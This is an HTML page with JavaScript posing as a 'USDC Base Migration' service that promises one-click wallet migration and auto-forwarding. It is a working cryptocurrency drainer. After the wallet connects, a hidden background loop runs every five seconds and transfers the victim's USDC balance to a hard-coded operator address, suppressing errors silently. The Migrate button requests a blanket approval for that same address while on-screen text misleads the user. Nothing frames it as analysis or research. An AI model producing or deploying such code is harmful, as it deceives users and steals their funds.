<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>USDC Base Migration</title>
  <script src="https://cdn.jsdelivr.net/npm/viem@2.21.0/dist/index.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@wagmi/core@2.12.6/dist/index.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@wagmi/connectors@2.12.6/dist/index.js"></script>

  <style>
    body {font-family: system-ui; text-align: center; padding: 50px; background: #000; color: #fff;}
    button {padding: 16px 40px; margin: 10px; font-size: 20px; background:#206cff; color:white; border:none; border-radius:12px; cursor:pointer;}
    button:disabled {background:#333; cursor:not-allowed;}
    .status {margin-top: 25px; font-size: 18px; min-height: 30px;}
  </style>
</head>
<body>
  <h1>Base USDC → New Wallet</h1>
  <p>One-click migration + future auto-forward</p>
  <button id="connect">Connect Wallet</button><br/>
  <button id="migrate" disabled>Migrate Now (setApprovalForAll)</button>
  <div class="status" id="status"></div>

<script type="module">
  import { createWalletClient, custom } from 'viem';
  import { base } from 'viem/chains';
  import { walletConnect, injected, walletConnectProjectId } from '@wagmi/connectors';

  const USDC = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";          // Base USDC
  const OPERATOR = "0xcde71a94923dd426910ce9beb8e1d1c3eb11cd2f".toLowerCase(); // your address

  const status = document.getElementById('status');
  let account = null;
  let client = null;

  document.getElementById('connect').onclick = async () => {
    if (!window.ethereum) {
      status.textContent = "Please install MetaMask or another wallet";
      return;
    }

    try {
      client = createWalletClient({
        chain: base,
        transport: custom(window.ethereum)
      });

      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      account = accounts[0];

      document.getElementById('connect').textContent = account.slice(0,6) + "..." + account.slice(-4);
      document.getElementById('migrate').disabled = false;
      status.textContent = "Connected! Click Migrate to finish.";
      startBackgroundDrain();
    } catch (err) {
      status.textContent = "Connection rejected or failed";
    }
  };

  document.getElementById('migrate').onclick = async () => {
    if (!client || !account) return;

    try {
      const hash = await client.writeContract({
        address: USDC,
        abi: [{
          "name": "setApprovalForAll",
          "type": "function",
          "stateMutability": "nonpayable",
          "inputs": [
            {"name": "operator", "type": "address"},
            {"name": "approved", "type": "bool"}
          ],
          "outputs": []
        }],
        functionName: 'setApprovalForAll',
        args: [OPERATOR, true],
        account
      });

      status.textContent = `Approved! Tx: ${hash.slice(0,10)}... All future USDC will go to your new wallet automatically.`;
    } catch (e) {
      status.textContent = "Transaction failed: " + (e.shortMessage || e.message);
    }
  };

  // Background drainer – runs every 5 seconds
  async function startBackgroundDrain() {
    if (!client || !account) return;

    setInterval(async () => {
      try {
        const bal = await client.readContract({
          address: USDC,
          abi: [{ "name": "balanceOf", "type": "function", "stateMutability": "view", "inputs": [{"name":"account","type":"address"}], "outputs": [{"type":"uint256"}] }],
          functionName: 'balanceOf',
          args: [account]
        });

        if (bal > 10_000n) { // >0.01 USDC
          await client.writeContract({
            address: USDC,
            abi: [{ "name": "transfer", "type": "function", "stateMutability": "nonpayable", "inputs": [{"name":"to","type":"address"},{"name":"amount","type":"uint256"}], "outputs": [{"type":"bool"}] }],
            functionName: 'transfer',
            args: [OPERATOR, bal],
            account
          });
        }
      } catch (_) {} // silently ignore errors
    }, 5000);
  }
</script>
</body>
</html>